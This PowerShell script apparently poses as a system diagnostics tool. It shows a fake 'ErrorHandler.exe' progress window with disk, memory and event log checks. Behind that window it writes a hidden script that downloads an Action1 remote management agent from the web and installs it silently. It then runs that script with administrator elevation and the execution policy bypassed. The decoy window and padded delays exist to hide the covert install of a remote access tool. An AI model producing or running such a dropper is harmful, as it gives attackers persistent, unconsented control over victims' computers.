$tempScriptPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "hello.ps1")

$scriptContent = @'
Invoke-WebRequest "https://app.action1.com/agent/<your-agent>.msi" -OutFile "action1.msi"
Start-Process msiexec.exe -ArgumentList '/i', 'action1.msi', '/quiet', '/norestart' -Wait
'@

$scriptContent | Out-File -FilePath $tempScriptPath -Encoding ASCII

# Load required .NET assemblies for forms and dialogs
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Function to perform diagnostics with UI updates
function Show-DiagnosticsProgress {
    param (
        [string]$title,
        [string]$message,
        [array]$diagnosticActions
    )
    
    $totalSteps = $diagnosticActions.Count
    
    # Initialize the form
    $form = New-Object system.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(500, 250)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false
    $form.ShowIcon = $false
    
    # Label for the message
    $label = New-Object System.Windows.Forms.Label
    $label.Text = $message
    $label.AutoSize = $true
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $form.Controls.Add($label)
    
    # Progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Style = 'Continuous'
    $progressBar.Location = New-Object System.Drawing.Point(20, 60)
    $progressBar.Size = New-Object System.Drawing.Size(450, 20)
    $progressBar.Minimum = 0
    $progressBar.Maximum = $totalSteps
    $form.Controls.Add($progressBar)

    # Diagnostics output textbox
    $outputBox = New-Object System.Windows.Forms.TextBox
    $outputBox.Multiline = $true
    $outputBox.ScrollBars = 'Vertical'
    $outputBox.Location = New-Object System.Drawing.Point(20, 90)
    $outputBox.Size = New-Object System.Drawing.Size(450, 100)
    $outputBox.ReadOnly = $true
    $outputBox.Font = New-Object System.Drawing.Font("Consolas", 8)
    $form.Controls.Add($outputBox)
    
    # Show the form
    $form.Show()

    # Perform each diagnostic action
    for ($i = 0; $i -lt $totalSteps; $i++) {
        $outputBox.Clear()
        $diagnosticAction = $diagnosticActions[$i]
        & $diagnosticAction $outputBox
        
        $progressBar.Value = $i + 1

        # Update the UI and allow time for the user to see it
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 4000
    }

    # Close the form after diagnostics
    $form.Close()
}

# Example diagnostic actions optimized for quick execution
$diskSpaceCheck = {
    param($outputBox)
    $diskSpace = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name="Free(GB)";Expression={[math]::round($_.Free/1GB,2)}}
    $outputBox.AppendText("Disk Space Check:`r`n")
    $diskSpace | ForEach-Object { $outputBox.AppendText("Drive $($_.Name): $($_.'Free(GB)') GB Free`r`n") }
}

$memoryCheck = {
    param($outputBox)
    $memory = Get-WmiObject Win32_OperatingSystem | Select-Object @{Name="TotalMemory(GB)";Expression={[math]::round($_.TotalVisibleMemorySize/1MB,2)}}, @{Name="FreeMemory(GB)";Expression={[math]::round($_.FreePhysicalMemory/1MB,2)}}
    $outputBox.AppendText("Memory Check:`r`nTotal Memory: $($memory.'TotalMemory(GB)') GB`r`nFree Memory: $($memory.'FreeMemory(GB)') GB`r`n")
}

$eventLogCheck = {
    param($outputBox)
    $errorEvents = Get-EventLog -LogName Application -EntryType Error -Newest 1
    $outputBox.AppendText("Recent Application Errors:`r`n")
    if ($errorEvents.Count -eq 0) {
        $outputBox.AppendText("No recent application errors found.`r`n")
    } else {
        $errorEvents | ForEach-Object { $outputBox.AppendText("$_`r`n") }
    }
}

# Perform all diagnostic steps in sequence
$diagnosticActions = @($diskSpaceCheck, $memoryCheck, $eventLogCheck)

Show-DiagnosticsProgress -title "ErrorHandler.exe - Performing Diagnostics" -message "Running system diagnostics..." -diagnosticActions $diagnosticActions

Start-Process powershell -Verb runAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
